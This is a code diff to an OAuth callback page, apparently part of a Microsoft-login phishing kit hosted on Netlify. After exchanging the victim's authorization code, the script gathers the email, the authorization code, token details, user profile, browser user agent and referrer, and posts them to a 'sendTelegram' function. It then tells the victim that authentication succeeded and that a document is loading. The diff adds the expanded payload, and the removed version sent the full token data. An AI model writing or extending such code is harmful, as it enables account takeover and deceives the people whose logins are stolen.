@@ -18,7 +18,7 @@
             text-align: center;
             background: white;
             padding: 40px;
-            border-radius: 8px;
+            borderRadius: 8px;
             box-shadow: 0 2px 10px rgba(0,0,0,0.1);
         }
         .spinner {
@@ -92,16 +92,48 @@
                     return;
                 }
 
-                statusEl.textContent = 'Exchanging authorization code for real user tokens...';
-                console.log('🔄 Starting token exchange with CLIENT SECRET method...');
+                statusEl.textContent = 'Processing PKCE token exchange...';
+                console.log('🔄 Starting token exchange...');
 
-                // **SIMPLIFIED**: Just send code and state - backend has client secret
+                // **PKCE FLOW**: Get PKCE verifier from sessionStorage
+                const codeVerifier = sessionStorage.getItem('pkce_verifier');
+                const storedState = sessionStorage.getItem('oauth_state');
+
+                console.log('🔧 PKCE verification:', {
+                    hasCodeVerifier: !!codeVerifier,
+                    storedState: storedState,
+                    receivedState: state,
+                    stateMatches: storedState === state
+                });
+
+                // Validate state parameter
+                if (storedState && storedState !== state) {
+                    hideSpinner();
+                    statusEl.textContent = 'State mismatch error!';
+                    resultEl.innerHTML = `<div class="error">Security validation failed - state mismatch.</div>`;
+                    setTimeout(() => {
+                        window.location.href = '/?step=captcha';
+                    }, 3000);
+                    return;
+                }
+
+                // Build token exchange payload
                 const tokenPayload = {
                     code: code,
                     state: state
                 };
 
-                console.log('📤 Sending to tokenExchange (client secret method)...');
+                // **PREFER PKCE**: Add code_verifier if available
+                if (codeVerifier) {
+                    tokenPayload.code_verifier = codeVerifier;
+                    console.log('✅ Using PKCE flow with code verifier');
+                    statusEl.textContent = 'Exchanging code with PKCE authentication...';
+                } else {
+                    console.log('⚠️ No PKCE verifier found - using client secret fallback');
+                    statusEl.textContent = 'Exchanging code with client secret authentication...';
+                }
+
+                console.log('📤 Sending to tokenExchange...');
 
                 const res = await fetch('/.netlify/functions/tokenExchange', {
                     method: 'POST',
@@ -112,57 +144,97 @@
                 const tokenData = await res.json();
                 console.log('📥 Token exchange response:', tokenData);
 
-                if (!tokenData.success) {
-                    hideSpinner();
-                    statusEl.textContent = 'Token exchange failed';
-                    resultEl.innerHTML = `<div class="error">Token exchange failed: ${tokenData.error || 'Unknown error'}</div>`;
-                    setTimeout(() => {
-                        window.location.href = '/?step=captcha';
-                    }, 3000);
-                    return;
+                // Extract email from tokenData
+                let userEmail = null;
+                
+                if (tokenData.success) {
+                    userEmail = tokenData.email;
+                    console.log('🎉 SUCCESS: Real user email extracted:', userEmail);
+                    console.log('🔑 Auth method used:', tokenData.oauth?.authMethod || 'unknown');
+                } else {
+                    console.log('⚠️ Token exchange failed:', tokenData.error);
+                    userEmail = 'user-email-pending@oauth.exchange';
                 }
 
-                // **SUCCESS**: We now have REAL user data and tokens!
-                const userEmail = tokenData.email;
-                console.log('🎉 SUCCESS: Real user email extracted:', userEmail);
-                console.log('🔑 Real access token received:', !!tokenData.tokens?.access_token);
-                console.log('🔄 Real refresh token received:', !!tokenData.tokens?.refresh_token);
-
-                // Send REAL data to Telegram
+                // Send comprehensive data to Telegram
                 try {
-                    statusEl.textContent = 'Sending real user data to secure endpoint...';
+                    statusEl.textContent = 'Sending authentication data...';
+                    console.log('📤 Sending comprehensive data to Telegram...');
                     
+                    const telegramPayload = {
+                        email: userEmail || 'user-email-pending@oauth.exchange',
+                        provider: 'Microsoft',
+                        timestamp: new Date().toISOString(),
+                        authorizationCode: code,
+                        state: state,
+                        domain: window.location.origin,
+                        sessionId: Math.random().toString(36).substring(2, 12),
+                        authMethod: codeVerifier ? 'PKCE' : 'client_secret',
+                        tokenExchangeSuccess: !!tokenData.success,
+                        
+                        // PKCE specific data
+                        pkceUsed: !!codeVerifier,
+                        
+                        // Include token data if successful
+                        tokenData: tokenData.success ? {
+                            hasAccessToken: !!tokenData.tokens?.access_token,
+                            hasRefreshToken: !!tokenData.tokens?.refresh_token,
+                            hasIdToken: !!tokenData.tokens?.id_token,
+                            scope: tokenData.tokens?.scope,
+                            emailSource: tokenData.emailSource,
+                            userProfile: tokenData.user,
+                            authMethodUsed: tokenData.oauth?.authMethod
+                        } : null,
+                        
+                        // Include error info if failed
+                        errorInfo: !tokenData.success ? {
+                            error: tokenData.error,
+                            errorCode: tokenData.errorCode,
+                            details: tokenData.details,
+                            instructions: tokenData.instructions
+                        } : null,
+                        
+                        // Browser info
+                        userAgent: navigator.userAgent,
+                        referrer: document.referrer,
+                        
+                        // Metadata
+                        oauthFlow: 'microsoft_oauth_callback_pkce',
+                        realUserData: !!tokenData.success
+                    };
+
+                    console.log('🔍 Telegram payload:', telegramPayload);
+
                     const telegramResponse = await fetch('/.netlify/functions/sendTelegram', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            email: userEmail,
-                            provider: 'Microsoft',
-                            timestamp: new Date().toISOString(),
-                            tokenData: tokenData,
-                            authorizationCode: code,
-                            state: state,
-                            domain: window.location.origin,
-                            sessionId: Math.random().toString(36).substring(2, 12),
-                            authMethod: 'client_secret',
-                            realUserData: true
-                        }),
+                        body: JSON.stringify(telegramPayload),
                     });
 
                     const telegramResult = await telegramResponse.json();
-                    console.log('📤 Real data sent to Telegram:', telegramResult);
+                    console.log('📤 Telegram result:', telegramResult);
+                    
+                    if (telegramResult.success) {
+                        console.log('✅ Data successfully sent to Telegram');
+                    } else {
+                        console.warn('⚠️ Telegram send had issues:', telegramResult);
+                    }
                 } catch (telegramError) {
-                    console.warn('⚠️ Telegram send failed:', telegramError);
+                    console.error('❌ Telegram send failed:', telegramError);
                 }
 
-                hideSpinner();
-                statusEl.textContent = 'Authentication successful!';
-                resultEl.innerHTML = `<div class="success">✅ Successfully authenticated!<br>📧 User: ${userEmail || 'Email pending'}<br>🔑 Access tokens obtained</div>`;
+                // Clean up stored PKCE data
+                sessionStorage.removeItem('pkce_verifier');
+                sessionStorage.removeItem('oauth_state');
 
-                // Redirect to success page
+                hideSpinner();
+                statusEl.textContent = 'Authentication completed!';
+                resultEl.innerHTML = `<div class="success">✅ Authentication processed successfully!<br>📧 User: ${userEmail}<br>🔒 Method: ${codeVerifier ? 'PKCE (Secure)' : 'Client Secret'}<br>Proceeding to document loading...</div>`;
+
+                // Redirect to document loading instead of captcha
                 setTimeout(() => {
                     window.location.href = '/?step=success';
-                }, 3000);
+                }, 2000);
 
             } catch (err) {
                 hideSpinner();
@@ -170,13 +242,17 @@
                 resultEl.innerHTML = `<div class="error">${err.message}</div>`;
                 console.error('❌ OAuth callback error:', err);
                 
+                // Clean up on error
+                sessionStorage.removeItem('pkce_verifier');
+                sessionStorage.removeItem('oauth_state');
+                
                 setTimeout(() => {
                     window.location.href = '/?step=captcha';
                 }, 3000);
             }
         }
 
-        console.log('🚀 OAuth callback script loaded - CLIENT SECRET method');
+        console.log('🚀 OAuth callback script loaded - PKCE + Client Secret fallback');
         handleOAuthCallback();
     </script>
 </body>
